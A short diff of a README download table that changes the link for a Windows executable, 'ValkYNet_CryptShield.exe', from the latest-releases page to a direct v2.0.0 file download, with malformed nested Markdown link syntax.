@@ -32,7 +32,7 @@
 
 | File | OS | Size |
 |------|----|------|
-| [`ValkYNet_CryptShield.exe`](https://github.com/hydr0cher/valkynet-cryptshield/releases/latest) | Windows 10 / 11 (64-bit) | ~25 MB |
+| [`ValkYNet_CryptShield.exe`]([https://github.com/hydr0cher/valkynet-cryptshield/releases/latest](https://github.com/hydr0cher/ValkYNet_CryptShield/releases/download/v2.0.0/ValkYNet_CryptShield.exe)) | Windows 10 / 11 (64-bit) | ~25 MB |
 
 **→ [Go to Releases](https://github.com/hydr0cher/valkynet-cryptshield/releases/latest)**
 
